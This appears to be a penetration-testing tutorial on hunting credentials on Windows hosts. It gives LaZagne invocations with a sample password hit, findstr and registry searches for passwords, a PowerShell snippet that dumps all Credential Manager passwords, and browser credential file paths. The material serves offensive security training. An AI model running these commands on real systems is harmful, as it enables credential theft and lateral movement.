# Credential Hunting in Windows

## Windows Credential Hunting

Credential hunting in Windows environments can yield valuable access that allows for privilege escalation or lateral movement. This process involves searching for plain-text credentials in files, database files, config files, saved credentials, CLI history, and more.

### Understanding the Target

Before diving into credential hunting, consider what an IT administrator might be doing on a day-to-day basis and which tasks require credentials:

* Domain administration
* Database management
* Service configuration
* Scheduled task creation
* Remote administration
* Script automation

### Key Search Terms

Whether using GUI or CLI tools, knowing what to search for is critical:

| Common Search Terms |              |             |
| ------------------- | ------------ | ----------- |
| Passwords           | Passphrases  | Keys        |
| Username            | User account | Creds       |
| Users               | Passkeys     | Passphrases |
| configuration       | dbcredential | dbpassword  |
| pwd                 | Login        | Credentials |

### Using LaZagne

LaZagne is a powerful tool for extracting stored credentials from numerous applications.

```cmd
C:\Users\bob\Desktop> start lazagne.exe all
```

This executes LaZagne and runs all included modules. Add the `-vv` option to see detailed background operations.

#### LaZagne Output Example

```
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
```

### Using findstr

Windows' built-in `findstr` command can search for patterns across many file types:

```cmd
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

### Common Credential Storage Locations

#### Configuration Files

* Web.config files
* App.config files
* ApplicationHost.config
* PHP configuration files
* XML configuration files

#### Registry

```powershell
# PowerShell commands to search registry for passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### Saved Credentials

```cmd
cmdkey /list
```

#### PowerShell History

```powershell
Get-History
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Additional Hunting Locations

* Passwords in Group Policy in the SYSVOL share
* Passwords in scripts in the SYSVOL share
* Password in scripts on IT shares
* Passwords in web.config files on dev machines and IT shares
* unattend.xml files
* Passwords in the AD user or computer description fields
* KeePass databases
* Files such as pass.txt, passwords.docx, passwords.xlsx

### Browser Stored Credentials

Modern browsers store credentials that can be extracted:

* Chrome: `%LocalAppData%\Google\Chrome\User Data\Default\Login Data`
* Firefox: `%AppData%\Mozilla\Firefox\Profiles\[profile]\logins.json`
* Edge: `%LocalAppData%\Microsoft\Edge\User Data\Default\Login Data`

Browser tools like LaZagne can extract these with proper commands:

```cmd
C:\> lazagne.exe browsers
```

### Service Account Credentials

Services often run with stored credentials:

```powershell
Get-WmiObject -Class Win32_Service | Where-Object {$_.StartName -notlike "LocalSystem" -and $_.StartName -notlike "NT AUTHORITY\*" -and $_.StartName -notlike "NT SERVICE\*"} | Select-Object Name, StartName, State
```

### Credential Manager

Windows Credential Manager stores various login credentials:

```powershell
# PowerShell script to access Credential Manager
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }
```

### Best Practices for Credential Hunting

1. **Be systematic**: Create a checklist of locations to examine
2. **Document findings**: Record all credentials and their sources
3. **Prioritize high-value targets**: Focus on administrative and service accounts
4. **Consider timing**: Some credentials may be exposed only during specific operations
5. **Look for patterns**: Users often reuse passwords with slight variations

By thoroughly exploring these common storage locations, you can often find credentials that provide increased access and privileges within a Windows environment.
